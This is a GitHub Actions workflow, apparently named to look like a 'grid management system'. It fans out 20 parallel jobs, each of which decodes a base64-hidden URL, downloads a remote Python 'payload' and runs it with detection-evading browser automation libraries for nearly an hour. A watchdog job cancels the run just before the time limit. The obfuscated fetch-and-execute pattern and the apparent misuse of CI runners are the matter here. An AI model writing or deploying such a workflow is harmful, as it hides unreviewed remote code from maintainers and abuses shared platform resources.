name: Aether Grid Management System

on:
  workflow_dispatch:

concurrency:
  group: grid-cluster-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watchdog: يراقب الوقت لمدة 59 دقيقة ثم يلغي عمل السيرفرات
  # =================================================================
  cluster-watchdog:
    name: "Aether Watchdog Routine"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      WATCH_DURATION: 3540
    steps:
      - name: Initialize Watchdog Engine
        run: |
          echo "[SYSTEM] Watchdog sequence initiated for Session ID: ${{ github.run_id }}"
          echo "[SYSTEM] Monitoring active thread for ${WATCH_DURATION} seconds."

          sleep "${WATCH_DURATION}"

          echo "[SYSTEM] Time-out threshold reached — executing cluster termination call."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[SYSTEM] Termination order dispatched. All worker tasks are being aborted."

  # =================================================================
  # Worker Nodes: التشغيل المتوازي لعقد المعالجة
  # =================================================================
  grid-workers:
    name: "Worker-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [A101, B102, C103, D104, E105, F106, G107, H108, J109, K110, L111, M112, N113, P114, Q115, R116, S117, T118, U119, V120]

    steps:
      # #################################################################
      # Phase 1: إعداد وتجهيز النظام
      # #################################################################
      - name: Setup Node Environment
        run: |
          echo "[SETUP] Preparing instance environment for Worker-${{ matrix.node_code }}..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # #################################################################
      # Phase 2: جلب واستخراج ملف التشغيل
      # #################################################################
      - name: Fetch Core Script
        run: |
          echo "[FETCH] Retrieving executable payload from secondary source..."
          REMOTE_SOURCE=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$REMOTE_SOURCE" -o runtime_engine.py
          echo "[FETCH] Payload successfully saved as runtime_engine.py."

      # #################################################################
      # Phase 3: تثبيت حزم الاعتماديات
      # #################################################################
      - name: Resolve Dependencies
        run: |
          echo "[DEPS] Installing required runtime libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # #################################################################
      # Phase 4: تشغيل ملف المعالجة ومراقبة الوقت
      # #################################################################
      - name: Execute Runtime Engine
        run: |
          echo "[EXEC] Starting process for Worker-${{ matrix.node_code }}..."

          python3 runtime_engine.py &
          TASK_PID=$!

          echo "[EXEC] Process spawned with PID ${TASK_PID}. Max execution limit: 3540 seconds."

          sleep 3540

          if kill -0 "$TASK_PID" 2>/dev/null; then
            echo "[EXEC] Max execution limit reached — forcefully shutting down process."
            kill -9 "$TASK_PID"
            echo "[EXEC] Process successfully ended by timer control."
          else
            echo "[EXEC] Process finished execution naturally before limit."
          fi
